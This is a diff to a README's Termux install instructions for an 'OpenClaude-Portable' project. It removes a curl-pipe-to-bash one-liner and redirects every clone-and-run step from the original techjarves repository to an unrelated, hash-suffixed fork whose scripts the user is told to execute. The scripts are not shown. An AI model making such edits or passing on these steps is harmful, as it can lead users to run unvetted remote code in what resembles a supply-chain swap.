@@ -55,19 +55,19 @@ chmod +x start.sh
 ### Termux (Android)
 **One-liner setup**
 ```bash
-curl -sSL https://raw.githubusercontent.com/techjarves/OpenClaude-Portable/main/termux-setup.sh | bash
+git clone --depth=1 https://github.com/tundefund0-gif/openclaude-portable-db93a6d3.git ~/openclaude-portable && bash ~/openclaude-portable/termux-setup.sh
 ```
-This will install Node.js, clone the repo, and prepare everything. Then just run:
+This installs Node.js, sets up the environment, and prepares everything. Then run:
 ```bash
-cd OpenClaude-Portable && ./start.sh
+cd ~/openclaude-portable && ./start.sh
 ```
 
 Or manually:
 ```bash
 pkg install -y nodejs curl git
-git clone --depth=1 https://github.com/techjarves/OpenClaude-Portable.git
-cd OpenClaude-Portable
-chmod +x start.sh
+git clone --depth=1 https://github.com/tundefund0-gif/openclaude-portable-db93a6d3.git ~/openclaude-portable
+cd ~/openclaude-portable
+chmod +x start.sh termux-setup.sh
 ./start.sh
 ```
 
